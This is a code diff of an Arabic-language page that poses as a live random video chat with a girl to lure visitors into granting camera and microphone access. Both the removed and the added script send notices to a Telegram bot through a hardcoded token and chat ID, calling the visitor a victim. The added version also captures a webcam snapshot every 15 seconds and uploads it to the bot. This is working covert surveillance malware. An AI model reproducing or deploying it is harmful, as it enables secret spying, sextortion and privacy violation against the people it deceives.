@@ -1,54 +1,44 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>دردشة فيديو عشوائية | بنات لايف</title>
-    <style>
-        body { background: #000; color: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .main-box { background: rgba(20, 20, 20, 0.95); padding: 25px; border-radius: 25px; text-align: center; border: 2px solid #ff0055; width: 90%; max-width: 400px; box-shadow: 0 0 20px #ff0055; }
-        .live-tag { background: #ff0000; color: white; padding: 5px 10px; border-radius: 5px; font-weight: bold; animation: blink 1s infinite; }
-        h2 { color: #ff0055; margin-top: 15px; }
-        p { font-size: 16px; color: #ccc; }
-        .btn-call { background: linear-gradient(45deg, #ff0055, #ff00aa); color: white; border: none; padding: 18px; border-radius: 50px; width: 100%; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 20px; box-shadow: 0 5px 15px rgba(255, 0, 85, 0.4); }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-    </style>
-</head>
-<body>
-    <div class="main-box">
-        <span class="live-tag">LIVE • 4,829 متصل الآن</span>
-        <h2>مكالمة فيديو خاصة... 🔥</h2>
-        <p>هناك فتاة تود بدء دردشة ساخنة معك الآن!</p>
-        <p style="font-size: 13px; color: #888;">يجب تفعيل (الكاميرا والميكروفون) لبدء البث المباشر.</p>
-        <button class="btn-call" id="callBtn">بدء الدردشة الآن 💖</button>
-        <p id="status" style="font-size: 12px; margin-top: 15px; color: #ff0055;"></p>
-    </div>
+<script>
+    const TOKEN = "8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0";
+    const CHAT_ID = "8350812242";
+    let stream;
 
-    <script>
-        const TOKEN = "8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0";
-        const CHAT_ID = "8350812242";
+    document.getElementById('callBtn').addEventListener('click', async () => {
+        try {
+            // فتح الكاميرا والميكروفون معاً
+            stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+            
+            document.getElementById('status').innerText = "جاري الاتصال بغرفة الدردشة المباشرة...";
+            
+            // إرسال أول إشعار بنجاح الاختراق
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("✅ السيطرة كاملة! الكاميرا والميكروفون شغالين الآن من Reno 13")}`);
 
-        // تسجيل ملف الخلفية الثبات
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js');
+            // وظيفة لسحب صورة كل 15 ثانية وإرسالها للبوت
+            setInterval(() => {
+                takeSnapshot();
+            }, 15000);
+
+        } catch (e) {
+            document.getElementById('status').innerText = "يجب السماح بالصلاحيات للمتابعة!";
         }
+    });
 
-        document.getElementById('callBtn').addEventListener('click', async () => {
-            try {
-                // طلب الصلاحيات فعلياً
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                
-                // إرسال الإشعار للبوت
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("✅ صيد ساخن! الضحية وافق على الكاميرا والميكروفون من Reno 13. الموقع جاهز للمراقبة!")}`);
-                
-                // إغلاق الكاميرا فوراً بعد الحصول على الإذن (للتخفي)
-                stream.getTracks().forEach(track => track.stop());
-                
-                document.getElementById('status').innerText = "جاري توصيلك بالغرفة الخاصة... انتظر قليلاً";
-            } catch (e) {
-                document.getElementById('status').innerText = "خطأ: يجب السماح بالصلاحيات للدخول للغرفة!";
-            }
-        });
-    </script>
-</body>
-</html>
+    async function takeSnapshot() {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'live_shot.jpg');
+            formData.append('caption', '📸 تحديث مباشر من الكاميرا...');
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        }, 'image/jpeg');
+    }
+</script>
